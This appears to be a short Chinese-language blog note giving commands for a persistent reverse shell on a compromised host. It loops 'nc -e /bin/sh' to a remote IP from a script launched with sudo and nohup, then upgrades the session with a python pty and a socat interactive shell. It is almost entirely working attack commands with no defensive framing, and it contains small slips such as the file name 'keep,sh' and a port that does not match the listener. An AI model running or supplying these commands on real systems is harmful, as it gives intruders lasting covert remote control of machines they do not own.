---
title: 持久化反弹一个能使用方向键的shell
date: 2023-07-12 23:14:35
tags:
---

服务端
```bash
ncat -lvnp 4444
```
被控端
```bash
echo 'while true; do nc -e /bin/sh 10.0.3.4 5001; done' > keep,sh
chmod a+x ./keep.sh
sudo nohup ./keep.sh &
```
提升到pty
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
进一步提升可以使用tab，方向键，ctrl+c SEGINT等
服务端
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
被控端
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
export TERM=xterm256-color
 ```
参考:https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
